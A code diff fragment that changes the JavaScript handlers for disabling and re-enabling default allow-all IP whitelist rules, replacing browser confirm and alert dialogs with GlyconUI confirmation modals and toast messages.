-            fetch('{{ base_url }}/api/deactivate_default_subnets', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                credentials: 'include'
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    alert(data.message || 'Allow all rules deactivated successfully');
-                    fetchIPWhitelist();
-                } else {
-                    alert(data.message || 'Error deactivating allow all rules');
-                }
-            })
-            .catch(() => {
-                alert('Error deactivating allow all rules');
-            });
-        }
+    document.getElementById('deactivateDefaultsBtn').addEventListener('click', async function() {
+        const confirmed = await GlyconUI.confirm({
+            title: 'Disable Default Allow-All Rules',
+            message: 'Are you sure you want to disable the default IPv4/IPv6 allow-all (0.0.0.0/0) rules? Make sure your current operator IP is whitelisted first!',
+            confirmText: 'Disable Allow-All',
+            variant: 'warning'
+        });
+        if (!confirmed) return;
+
+        fetch('{{ base_url }}/api/deactivate_default_subnets', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include'
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                GlyconUI.toast('Security Hardened', data.message || 'Allow-all rules disabled', 'warning');
+                fetchIPWhitelist();
+            } else {
+                GlyconUI.toast('Error', data.message || 'Failed to update rules', 'danger');
+            }
+        });
     });
 
-    // Handle reactivate defaults button
-    document.getElementById('reactivateDefaultsBtn').addEventListener('click', function() {
-        if (confirm('Are you sure you want to reactivate allow all rules? This will enable the default IPv4 and IPv6 allow-all rules.')) {
-            fetch('{{ base_url }}/api/reactivate_default_subnets', {
-                method: 'POST',
-                headers: {'Content-Type': 'application/json'},
-                credentials: 'include'
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.status === 'success') {
-                    alert(data.message || 'Allow all rules reactivated successfully');
-                    fetchIPWhitelist();
-                } else {
-                    alert(data.message || 'Error reactivating allow all rules');
-                }
-            })
-            .catch(() => {
-                alert('Error reactivating allow all rules');
-            });
-        }
+    document.getElementById('reactivateDefaultsBtn').addEventListener('click', async function() {
+        const confirmed = await GlyconUI.confirm({
+            title: 'Re-enable Default Allow-All Rules',
+            message: 'This will permit connections from any IPv4/IPv6 address (0.0.0.0/0). Continue?',
+            confirmText: 'Enable Allow-All',
+            variant: 'primary'
+        });
+        if (!confirmed) return;
+
+        fetch('{{ base_url }}/api/reactivate_default_subnets', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            credentials: 'include'
+        })
+        .then(r => r.json())
+        .then(data => {
+            if (data.status === 'success') {
+                GlyconUI.toast('Whitelist Updated', data.message || 'Allow-all rules re-enabled', 'info');
+                fetchIPWhitelist();
+            } else {
+                GlyconUI.toast('Error', data.message || 'Failed to update rules', 'danger');
+            }
+        });
     });
 });
 </script>
